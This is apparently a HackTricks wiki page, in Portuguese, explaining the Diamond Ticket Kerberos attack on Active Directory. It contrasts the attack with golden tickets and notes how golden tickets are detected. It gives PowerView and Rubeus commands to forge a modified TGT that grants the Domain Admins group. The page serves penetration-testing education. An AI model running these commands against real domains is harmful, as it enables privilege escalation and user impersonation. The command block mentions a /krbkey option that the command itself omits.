# Diamond Ticket

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Diamond Ticket

**Como um bilhete de ouro**, um bilhete de diamante é um TGT que pode ser usado para **acessar qualquer serviço como qualquer usuário**. Um bilhete de ouro é forjado completamente offline, criptografado com o hash krbtgt daquele domínio, e então passado para uma sessão de logon para uso. Como os controladores de domínio não rastreiam os TGTs que (ou eles) emitiram legitimamente, eles aceitarão felizmente TGTs que são criptografados com seu próprio hash krbtgt.

Existem duas técnicas comuns para detectar o uso de bilhetes de ouro:

* Procure por TGS-REQs que não têm um AS-REQ correspondente.
* Procure por TGTs que têm valores absurdos, como o tempo de vida padrão de 10 anos do Mimikatz.

Um **bilhete de diamante** é feito por **modificar os campos de um TGT legítimo que foi emitido por um DC**. Isso é alcançado por **solicitar** um **TGT**, **descriptografá-lo** com o hash krbtgt do domínio, **modificar** os campos desejados do bilhete e, em seguida, **recriptografá-lo**. Isso **supera as duas desvantagens mencionadas anteriormente** de um bilhete de ouro porque:

* TGS-REQs terão um AS-REQ anterior.
* O TGT foi emitido por um DC, o que significa que terá todos os detalhes corretos da política Kerberos do domínio. Mesmo que esses possam ser forjados com precisão em um bilhete de ouro, é mais complexo e suscetível a erros.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporte o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
